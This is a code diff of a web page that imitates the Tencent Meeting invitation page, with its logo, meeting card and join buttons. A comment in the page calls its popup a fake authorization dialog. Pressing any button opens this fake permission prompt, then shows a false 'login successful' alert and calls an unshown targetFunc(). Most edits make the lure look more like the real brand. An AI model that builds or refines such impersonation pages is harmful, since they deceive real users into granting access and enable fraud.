@@ -7,16 +7,17 @@
     <title>腾讯会议</title>
     <meta name="description" content="基于腾讯20多年音视频通讯经验，腾讯会议提供一站式音视频会议解决方案，让您能随时随地体验高清流畅的会议以及会议协作。" />
     <link rel="icon" href="https://meeting.tencent.com/favicon.ico">
+    <script src="./include/jquery.min.js"></script>
 </head>
 
 <body>
     <div class="topNav">
         <div align="left" class="langSel">
-            简体中文▾
+            &nbsp;🌐&nbsp;简体中文&nbsp;▾
         </div>
         <div align="center" class="centeralLogo">
             <img
-                src="data:image/svg+xml;charset=utf-8;base64,PHN2ZyB2ZXJzaW9uPSIxLjIiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgdmlld0JveD0iMCAwIDU1MCAxNTAiIHdpZHRoPSI1NTAiIGhlaWdodD0iMTUwIj48c3R5bGU+dHNwYW57d2hpdGUtc3BhY2U6cHJlfS5he2ZpbGw6bm9uZTtzdHJva2U6IzQ3NDc0NztzdHJva2Utd2lkdGg6Nn0uYntmb250LXNpemU6IDgwcHg7ZmlsbDogIzRmNGY0Zjtmb250LXdlaWdodDogNzAwO2ZvbnQtZmFtaWx5OiAiU291cmNlSGFuU2Fuc1NDLUJvbGQiLCAiU291cmNlIEhhbiBTYW5zIFNDIn08L3N0eWxlPjxwYXRoIGNsYXNzPSJhIiBkPSJtMjMuNSAxMDMuNmMtNy4zLTcuNi03LjMtMTkuOCAwLTI3LjNsNDcuMy00OC4zIDMxLjUgMzIuMi02MC42IDYxLjl6Ii8+PHBhdGggY2xhc3M9ImEiIGQ9Im0xMzQgMjguNmwzMS44IDMxLjctNjEuOSA2MS45LTMxLjctMzEuOHoiLz48cGF0aCBjbGFzcz0iYSIgZD0ibTEzNSA5MS4zbDMwLjktMzAuOSAxNi43IDE2LjdjNy44IDcuOSA3LjcgMjAuNS0wLjEgMjguM2wtMTYuOCAxNi44eiIvPjx0ZXh0IHN0eWxlPSJ0cmFuc2Zvcm06bWF0cml4KDEsMCwwLDEsMjE0LjUsMTAzKSIgPjx0c3BhbiB4PSIwIiB5PSIwIiBjbGFzcz0iYiI+6IW+6K6v5Lya6K6uCjwvdHNwYW4+PC90ZXh0Pjwvc3ZnPg==">
+                src="data:image/svg+xml;charset=utf-8;base64,PHN2ZyB2ZXJzaW9uPSIxLjIiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgdmlld0JveD0iMCAwIDU1MCAxNTAiIHdpZHRoPSI1NTAiIGhlaWdodD0iMTUwIj48c3R5bGU+dHNwYW57d2hpdGUtc3BhY2U6cHJlfS5he2ZpbGw6bm9uZTtzdHJva2U6I2JhYmJiYjtzdHJva2Utd2lkdGg6Nn0uYntmb250LXNpemU6IDgwcHg7ZmlsbDogI2JhYmJiYjtmb250LXdlaWdodDogNTAwO2ZvbnQtZmFtaWx5OiAiU291cmNlSGFuU2Fuc1NDLUJvbGQiLCAiU291cmNlIEhhbiBTYW5zIFNDIn08L3N0eWxlPjxwYXRoIGNsYXNzPSJhIiBkPSJtMjMuNSAxMDMuNmMtNy4zLTcuNi03LjMtMTkuOCAwLTI3LjNsNDcuMy00OC4zIDMxLjUgMzIuMi02MC42IDYxLjl6Ii8+PHBhdGggY2xhc3M9ImEiIGQ9Im0xMzQgMjguNmwzMS44IDMxLjctNjEuOSA2MS45LTMxLjctMzEuOHoiLz48cGF0aCBjbGFzcz0iYSIgZD0ibTEzNSA5MS4zbDMwLjktMzAuOSAxNi43IDE2LjdjNy44IDcuOSA3LjcgMjAuNS0wLjEgMjguM2wtMTYuOCAxNi44eiIvPjx0ZXh0IHN0eWxlPSJ0cmFuc2Zvcm06bWF0cml4KDEsMCwwLDEsMjE0LjUsMTAzKSIgPjx0c3BhbiB4PSIwIiB5PSIwIiBjbGFzcz0iYiI+6IW+6K6v5Lya6K6uPC90c3Bhbj48L3RleHQ+PC9zdmc+">
         </div>
         <div align="right" class="loginBtn" onclick="location.href='https://meeting.tencent.com/qrcode-login.html'">
             登录&nbsp;
@@ -25,9 +26,9 @@
 
     <div class="detailCard">
         <div class="cardLogo">
-            <img src="./sub_header_title.png">
-            <span class="meetingTitle">John的快速会议</span>
-            <span class="meetingCode">533 331 824</span>
+            <img src="./include/sub_header_title.png">
+            <p class="meetingTitle"><span class="dynamic_creater">John</span>的快速会议</p>
+            <p class="meetingCode">533 331 824</p>
         </div>
         <div class="cardDetail">
             <table class="meetingTime">
@@ -36,7 +37,8 @@
                     <td align="center" style="font-size: 12px; color: #cecece;">
                         —
                         <span
-                            style="margin:10px 20px; background:#eff2f6; color:#555; padding:2px 6px; border-radius:4px; font-size: x-small;">1 小时</span>
+                            style="margin:10px 20px; background:#f5f6f7; color:#4e5461; padding:2px 6px; border-radius:3px; font-size:10px;">1
+                            小时</span>
                         —
                     </td>
                     <td align="right" style="font-size: 30px; color: #000;" class="meetingTimeSpan">20:35</td>
@@ -50,28 +52,35 @@
 
             <hr class="dashed-hr">
             <div class="createrDetail">
-                <img class="img1" src="./head.png">
+                <img class="img1" src="./include/head.png">
                 <div>
                     <p class="r1">发起人</p>
-                    <p class="r2">John <img src="./give.webp" class="img2"></p>
+                    <p class="r2">
+                        <span class="dynamic_creater">John</span>
+                        <img src="./include/give.webp" class="img2">
+                    </p>
                 </div>
             </div>
             <hr class="dashed-hr">
-            <button class="wideBtn-solid">📆 点击添加到会议列表</button>
+            <button class="wideBtn-plain" id="addtoMeetingPlanBtn">📆 点击添加到会议列表</button>
+            <div style="height:5px"></div>
         </div>
     </div>
 
+    <!-- 底部按钮 -->
     <div class="bottomButton">
-        <button class="wideBtn-solid" id="enterMeetingBtn_miniPrograme">小程序入会</button>
-        <button class="wideBtn" id="enterMeetingBtn">加入会议</button>
+        <button class="wideBtn" id="enterMeetingBtn_miniPrograme">小程序入会</button>
+        <button class="wideBtn-solid" id="enterMeetingBtn">加入会议</button>
+        <p class="tipText">你可以<a href="javascript:alert('会议邀请已复制到剪贴板')">复制会议邀请</a>，发送至会议成员</p>
     </div>
 
+    <!-- 假授权弹窗 -->
     <div class="permissionDlg" style="display:none;">
         <div class="dlgBody">
             <table class="dlgContent">
                 <tr height="50px" class="appDetail">
                     <td align="left" width="38px">
-                        <img src="https://meeting.tencent.com/favicon.ico" height="35px" style="border-radius:30px;">
+                        <img src="./include/favicon.ico" height="35px" style="border-radius:30px;">
                     </td>
                     <td align="left">腾讯会议</td>
                     <td align="right">申请</td>
@@ -115,81 +124,82 @@
 
         /* ---- */
         function $GET(name) {
-            var reg = new RegExp('(^|&)' + name + '=([^&]*)(&|$)', 'i');
-            var r = window.location.search.substr(1).match(reg);
-            if (r != null) { return unescape(r[2]); }
-            return "";
+            var paraPart = window.location.search;
+            var reg = new RegExp("(^|&)" + name + "=([^&]*)(&|$)");
+            var r = paraPart.substr(1).match(reg);
+            if (r != null) return unescape(r[2]); return null;
+            if (r != null) return decodeURI(r[2]); return null;
         }
 
         window.onload = function () {
-            /* 元素选择区 */
-            var enterMeetingBtn = document.getElementById("enterMeetingBtn");
-            var enterMeetingBtn_mp = document.getElementById("enterMeetingBtn_miniPrograme");
-            var cancelBtn = document.getElementById("cancelBtn");
-            var confirmBtn = document.getElementById("confirmBtn");
-            var permissionDlg = document.getElementsByClassName("permissionDlg")[0];
-            var meetingDate = document.getElementsByClassName("meetingDate");
-            var meetingTime = document.getElementsByClassName("meetingTimeSpan");
-
             /* 初始化区 */
-            (function(){
+            (function () {
                 const date = new Date();
                 const year = date.getFullYear();
                 const month = ('0' + (date.getMonth() + 1)).slice(-2);
                 const strDate = ('0' + date.getDate()).slice(-2);
 
-                meetingDate[1].innerHTML = meetingDate[0].innerHTML = year + "年" + month + "月" + strDate + "日";
+                $(".meetingDate").html(year + "年" + month + "月" + strDate + "日");
             })();
-            (function(){
+            (function () {
                 const now = new Date();
                 var hours = now.getHours();
                 var minutes = now.getMinutes();
-                if(minutes < 15) {minutes = 0}
-                else if(minutes < 30) {minutes = 15}
-                else if(minutes < 45) {minutes = 30}
-                else if(minutes < 59) {minutes = 45}
+                if (minutes < 15) { minutes = 0 }
+                else if (minutes < 30) { minutes = 15 }
+                else if (minutes < 45) { minutes = 30 }
+                else if (minutes < 59) { minutes = 45 }
 
                 minutes = ('0' + minutes).slice(-2);
-                
-                meetingTime[0].innerHTML = ('0' + hours).slice(-2) + ":" + minutes;
-                meetingTime[1].innerHTML = ('0' + (hours + 1)).slice(-2) + ":" + minutes;
+
+                $(".meetingTimeSpan").eq(0).html(('0' + hours).slice(-2) + ":" + minutes);
+                $(".meetingTimeSpan").eq(1).html(('0' + (hours + 1)).slice(-2) + ":" + minutes);
             })();
 
             /* 事件区 */
-            enterMeetingBtn.onclick = enterMeetingBtn_mp.onclick = function () {
+            $("#enterMeetingBtn_miniPrograme,#enterMeetingBtn,#addtoMeetingPlanBtn").click(function() {
                 setTimeout(function () {
-                    permissionDlg.setAttribute("style", "display:block;");
+                    $(".permissionDlg").show();
+                    $(".permissionDlg").css("bottom","-50vh")
+                    $(".permissionDlg").css("opacity","0.2");
+                    $(".permissionDlg").animate({bottom:"0px", opacity:"1"},200);
                 }, 200);
-            }
+            });
 
-            confirmBtn.onclick = function () {
-                permissionDlg.setAttribute("style", "display:none;");
-                location.href = "?status=login";
-            }
-            cancelBtn.onclick = function () {
-                permissionDlg.setAttribute("style", "display:none;");
-                location.href = "?status=login_fail";
-            }
+            $("#confirmBtn").click(function() {
+                $(".permissionDlg").animate({bottom:"-50vh", opacity:"0"},200);
+                setTimeout(function () {
+                    $(".permissionDlg").hide();
+                    location.href = "?status=login";
+                }, 200);
+            });
+            $("#cancelBtn").click(function() {
+                $(".permissionDlg").animate({bottom:"-50vh", opacity:"0"},200);
+                setTimeout(function () {
+                    $(".permissionDlg").hide();
+                    location.href = "?status=login_fail";
+                }, 200);
+            });
 
             /* 状态判断区 */
             if ($GET("status") == "login") {
-                document.getElementsByTagName("title")[0].innerHTML = "登录中...";
-                document.getElementsByClassName("detailCard")[0].remove();
+                $("title").text("登录中...");
+                $(".detailCard").hide();
 
                 setTimeout(function () {
                     alert("登录成功");
-                    document.getElementsByTagName("title")[0].innerHTML = "登录成功 | 腾讯会议";
+                    $("title").text("登录成功 | 腾讯会议");
                 }, 400);
                 setTimeout(function () {
                     targetFunc()
                 }, 1000);
             } else if ($GET("status") == "login_fail") {
-                document.getElementsByTagName("title")[0].innerHTML = "登录中...";
-                document.getElementsByClassName("detailCard")[0].remove();
+                $("title").text("登录中...");
+                $(".detailCard").hide();
 
                 setTimeout(function () {
                     alert("未登录，请授权登录");
-                    document.getElementsByTagName("title")[0].innerHTML = "未登录 | 腾讯会议";
+                    $("title").text("未登录 | 腾讯会议");
                 }, 400);
                 setTimeout(function () {
                     top.location.href = "?status=refresh";
@@ -207,19 +217,20 @@
             background-color: #f7f8fc;
             user-select: none;
             -webkit-appearance: none !important;
-            font-family: "Hiragino Sans GB", "Microsoft YaHei", "WenQuanYi Micro Hei", sans-serif;
-
+            font-family: "PingFangSC-Medium", "Microsoft YaHei", "WenQuanYi Micro Hei", sans-serif;
             -webkit-user-drag: none;
             -moz-user-drag: none;
         }
-        .dashed-hr{
-            border:none;
-            border-top:1px dashed #CCC;
-            width:calc(100% - 30px);
-            margin:5px;
+
+        .dashed-hr {
+            border: none;
+            border-top: 1px dashed #CCC;
+            width: calc(100% - 30px);
+            margin: 5px;
         }
+
         .topNav {
-            width: caLC(100vw - 20px);
+            width: calc(100vw - 20px);
             padding: 10px;
             display: flex;
             flex-direction: row;
@@ -230,22 +241,22 @@
 
         .topNav .langSel {
             cursor: pointer;
-            width: 20%;
+            width: 35%;
             text-align: left;
             color: #3c3c3c;
-            font-size: 13px
+            font-size: 13px;
         }
 
         .topNav .loginBtn {
             color: #006fff;
             cursor: pointer;
-            width: 20%;
+            width: 35%;
             text-align: right;
             font-size: 13px
         }
 
         .topNav .centeralLogo {
-            width: 60%;
+            width: 30%;
             text-align: center;
             color: #767676
         }
@@ -257,13 +268,13 @@
 
         /* ---- */
         .detailCard {
-            width: calc(100vw - 30px);
+            width: calc(100vw - 34px);
             padding: 0px;
-            margin: 15px;
-            margin-top: 10px;
+            margin: 17px;
+            margin-top: 6px;
             border: none;
-            border-radius: 10px;
-            box-shadow: 0 0 10px 0 rgba(0, 0, 0, .1);
+            border-radius: 8px;
+            box-shadow: 0 0 10px 0 rgba(0, 0, 0, .04);
             background-color: #FFF;
             overflow: hidden;
         }
@@ -272,7 +283,7 @@
             align-items: center;
             justify-content: center;
             text-align: center;
-            background: url(./sub_header.png);
+            background: url(./include/sub_header.png);
             background-repeat: no-repeat;
             background-size: cover;
             height: 140px;
@@ -283,19 +294,26 @@
         }
 
         .cardLogo img {
-            height: 22px;
-            margin: 20px;
+            height: 20px;
+            width: 117px;
+            margin-top: 90px;
+            margin-bottom: 30px;
             -webkit-user-drag: none
         }
 
         .cardLogo .meetingTitle {
-            margin: 10px;
-            font-size: 16px
+            margin: 8px;
+            font-size: 20px;
+            line-height: 26px;
+            font-weight: 500;
         }
 
         .cardLogo .meetingCode {
-            margin: 5px;
-            font-size: 14px
+            margin: 10px;
+            margin-bottom: 30px;
+            font-size: 20px;
+            font-weight: 500;
+            line-height: 26px;
         }
 
         .cardDetail {
@@ -303,7 +321,8 @@
             flex-direction: column;
             align-items: center;
             justify-content: center;
-            text-align: center
+            text-align: center;
+            margin-top: 25px;
         }
 
         .cardDetail .meetingTime {
@@ -319,52 +338,74 @@
             flex-direction: row;
             vertical-align: middle;
             text-align: left;
-            width:calc(100% - 15px);
+            width: calc(100% - 15px);
         }
+
         .createrDetail .img1 {
-            height: 35px;
+            height: 42px;
+            width: 42px;
             border-radius: 50px;
-            margin:5px 10px;
-            padding:1px;
-            background:#FFF;
+            margin: 5px 10px;
+            background: #FFF;
             box-shadow: 1px 1px 5px #e0e0e0;
         }
+
         .createrDetail .img2 {
-            height:16px;
+            width: 52px;
             transform: translateY(2px);
-            margin:0px 2px;
+            margin: 0px 2px;
         }
+
         .createrDetail .r1 {
             margin: 1px;
-            margin-top: 8px;
-            font-size:x-small;
-            color:#888;
+            font-size: 12px;
+            color: #4e5461;
+            line-height: 22px;
         }
+
         .createrDetail .r2 {
             margin: 1px;
-            font-size: medium;
-            color:#000;
+            font-size: 16px;
+            font-weight: 500;
+            color: #000;
+            line-height: 22px;
+            text-overflow: ellipsis;
         }
 
 
 
         .bottomButton {
-            width: calc(100vw - 30px);
-            padding: 0px;
-            margin: 15px;
-            margin-top: calc(100vh - 380px - 100px - 40px);
+            width: calc(100vw);
+            position: absolute;
+            bottom: 25px;
+            text-align: center;
+            display: flex;
+            justify-content: center;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .bottomButton .tipText {
+            color: #7b818f;
+            font-size: 12px;
+            margin: 6px;
+        }
+
+        .bottomButton .tipText a {
+            color: #006fff;
+            text-decoration: none;
         }
 
         .wideBtn-solid {
-            background-color: #006fff;
+            background-color: #06f;
             color: #FFF;
-            width: calc(100% - 20px);
+            width: calc(100% - 34px);
             cursor: pointer;
-            padding: 10px 3px;
-            border: 1px solid #006fff;
+            padding: 13px 3px;
+            border: 1px solid #06f;
             border-radius: 7px;
             margin: 5px 8px;
-            font-size: small;
+            font-size: 14px;
         }
 
         .wideBtn {
@@ -372,19 +413,31 @@
             /* border: 1px solid #006fff; */
             border: 1px solid #dcdcdc;
             color: #000000;
-            width: calc(100% - 20px);
+            width: calc(100% - 34px);
             cursor: pointer;
-            padding: 9px 4px;
+            padding: 12px 4px;
             border-radius: 7px;
             margin: 5px 8px;
-            font-size: small;
+            font-size: 14px;
+        }
+
+        .wideBtn-plain {
+            background-color: #FFF;
+            border: none;
+            color: #006fff;
+            width: calc(100% - 34px);
+            cursor: pointer;
+            padding: 8px 4px;
+            border-radius: 7px;
+            margin: 5px 8px;
+            font-size: 14px;
         }
 
         /* 模拟弹窗 */
         .permissionDlg {
             background: #00000050;
             position: fixed;
-            top: 0;
+            bottom: 0;
             left: 0;
             width: 100vw;
             height: 100vh;
